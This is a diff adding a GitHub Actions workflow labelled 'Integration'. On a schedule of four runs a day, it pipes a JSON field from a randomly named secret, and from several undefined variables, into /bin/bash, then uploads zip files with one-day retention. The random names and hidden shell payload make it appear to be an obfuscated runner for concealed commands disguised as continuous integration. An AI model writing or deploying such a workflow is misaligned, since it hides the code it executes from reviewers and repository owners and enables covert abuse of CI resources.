@@ -1,0 +1,31 @@
+name: Integration
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '46 0,6,12,18 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  agent:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Perform
+        env:
+          oigs5871: ${{ secrets.oigs5871 }}
+        run: |
+          printf '%s' "$oigs5871" | jq -r .rj277 | /bin/bash
+          echo $xib88 | jq -r .r226 | /bin/bash
+          echo $goso25 | jq -r .vr8588 | /bin/bash
+          printf '%s' "$f60652" | jq -r .xw4016 | /bin/bash
+          printf '%s' "$obsoa19" | jq -r .zjejs04 | /bin/bash
+          echo $jf08937 | jq -r .vxqqk384 | /bin/bash
+
+      - name: Upload results
+        uses: actions/upload-artifact@v4
+        with:
+          name: I31VrI13
+          path: "*.zip"
+          retention-days: 1
